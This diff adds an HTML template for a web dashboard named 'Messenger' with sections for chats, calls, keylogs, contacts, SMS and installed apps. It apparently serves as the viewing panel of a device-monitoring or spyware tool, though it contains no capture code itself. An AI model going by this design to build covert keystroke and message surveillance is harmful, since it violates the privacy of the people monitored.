@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}Messenger{% endblock %}</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="{{ url_for('static', filename='js/feather.min.js') }}"></script>
+</head>
+<body>
+    <div class="sidebar">
+        <img src="{{ url_for('static', filename='images/logo.png') }}" alt="Messenger" class="messenger-logo">
+        <nav>
+            <ul>
+                <li data-section="chats" {% if request.endpoint == 'index' %}class="active"{% endif %}>
+                    <a href="#" title="Messages">
+                        <i data-feather="message-square"></i>
+                    </a>
+                </li>
+                <li data-section="calls" {% if request.endpoint == 'calls' %}class="active"{% endif %}>
+                    <a href="#" title="Calls">
+                        <i data-feather="phone"></i>
+                    </a>
+                </li>
+                <li data-section="keylogs" {% if request.endpoint == 'keylogs' %}class="active"{% endif %}>
+                    <a href="#" title="Keylogs">
+                        <i data-feather="key"></i>
+                    </a>
+                </li>
+                <li data-section="contacts" {% if request.endpoint == 'contacts' %}class="active"{% endif %}>
+                    <a href="#" title="Contacts">
+                        <i data-feather="users"></i>
+                   </a>
+                </li>
+                <li data-section="sms" {% if request.endpoint == 'sms' %}class="active"{% endif %}>
+                    <a href="#" title="SMS">
+                        <i data-feather="message-circle"></i>
+                    </a>
+                </li>
+                <li data-section="installed_apps" {% if request.endpoint == 'installed_apps' %}class="active"{% endif %}>
+                    <a href="#" title="Installed Apps">
+                        <i data-feather="grid"></i>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+    <div class="main-content">
+        <div class="upload-status">
+            <progress id="upload-progress" value="0" max="100" style="display: none;"></progress>
+            <span id="upload-message"></span>
+        </div>
+        <div id="chats" class="section active">
+            <div class="top-bar">
+                <h1>Chats</h1>
+                <div class="right-icons">
+                    <input type="file" id="file-upload" style="display: none;" accept=".csv, application/vnd.ms-excel, application/vnd.openxmlformats-officedocument.spreadsheetml.sheet">
+                    <label for="file-upload" class="upload-icon">
+                        <i data-feather="upload"></i>
+                    </label>
+                    <i data-feather="refresh-cw" onclick="refreshData('chats')"></i>
+                </div>
+            </div>
+            <input type="text" id="search-chats" placeholder="Search chats">
+            <div id="search-results-chats" class="search-results"></div>
+            <div class="chat-list" id="chat-list">
+             </div>
+         </div>
+
+        <div id="calls" class="section">
+            <div class="top-bar">
+                <h1>Calls</h1>
+                 <div class="right-icons">
+                    <i data-feather="refresh-cw" onclick="refreshData('calls')"></i>
+                </div>
+            </div>
+            <input type="text" id="search-calls" placeholder="Search calls">
+            <div id="search-results-calls" class="search-results"></div>
+           <div class="calls-list" id="calls-list">
+           </div>
+       </div>
+
+        <div id="keylogs" class="section">
+            <div class="top-bar">
+                <h1>Keylogs</h1>
+                <div class="right-icons">
+                    <i data-feather="refresh-cw" onclick="refreshData('keylogs')"></i>
+                </div>
+            </div>
+            <input type="text" id="search-keylogs" placeholder="Search keylogs">
+            <div id="search-results-keylogs" class="search-results"></div>
+           <div class="table-container">
+               <table id="keylogs-table">
+                    <thead>
+                        <tr>
+                           <th>Application</th>
+                            <th>Time</th>
+                            <th>Key Presses</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="contacts" class="section">
+            <div class="top-bar">
+                <h1>Contacts</h1>
+                <div class="right-icons">
+                   <i data-feather="refresh-cw" onclick="refreshData('contacts')"></i>
+                </div>
+            </div>
+           <input type="text" id="search-contacts" placeholder="Search contacts">
+           <div id="search-results-contacts" class="search-results"></div>
+           <div class="contacts-list" id="contacts-list">
+            </div>
+        </div>
+
+       <div id="sms" class="section">
+            <div class="top-bar">
+                <h1>SMS</h1>
+                <div class="right-icons">
+                     <i data-feather="refresh-cw" onclick="refreshData('sms')"></i>
+                </div>
+            </div>
+             <input type="text" id="search-sms" placeholder="Search SMS">
+             <div id="search-results-sms" class="search-results"></div>
+            <div class="sms-list" id="sms-list">
+             </div>
+        </div>
+
+        <div id="installed_apps" class="section">
+            <div class="top-bar">
+                <h1>Installed Apps</h1>
+                <div class="right-icons">
+                  <i data-feather="refresh-cw" onclick="refreshData('installed_apps')"></i>
+                </div>
+            </div>
+           <input type="text" id="search-apps" placeholder="Search apps">
+           <div id="search-results-apps" class="search-results"></div>
+            <div class="apps-list" id="apps-list">
+            </div>
+        </div>
+
+        <div class="chat-window hidden">
+           <div class="chat-header">
+                <button class="close-chat">X</button>
+               <h2 id="chat-window-name"></h2>
+            </div>
+            <div class="messages-container" id="chat-messages">
+            </div>
+       </div>
+
+        <div class="sms-window hidden">
+           <div class="sms-header">
+            <button class="close-sms">X</button>
+            <h2 id="sms-window-name"></h2>
+          </div>
+          <div class="messages-container" id="sms-messages">
+            </div>
+        </div>
+          <div class="inspector hidden">
+             <div class="inspector-header">
+                 <button class="close-inspector">X</button>
+                <h2 id="inspector-title">Inspector</h2>
+             </div>
+            <div class="inspector-content">
+                <div class="object-properties">
+                    <h3>Object properties</h3>
+                   <div class="size">
+                       <p>Width: <span class="width"></span></p>
+                       <p>Height: <span class="height"></span></p>
+                     </div>
+                </div>
+                 <div class="typeface">
+                     <h3>Typeface</h3>
+                     <p>Font-Family: <span class="font-family"></span></p>
+                     <p>Font-Size: <span class="font-size"></span></p>
+                      <p>Line-Height: <span class="line-height"></span></p>
+                    <p>Text-Align: <span class="text-align"></span></p>
+                     <p>Letter-Spacing: <span class="letter-spacing"></span></p>
+                 </div>
+                 <div class="colors">
+                    <h3>Colors</h3>
+                     <p>Fill: <span class="fill"></span></p>
+                  </div>
+            </div>
+       </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/app.js') }}" defer></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            feather.replace();
+        });
+    </script>
+</body>
+</html>
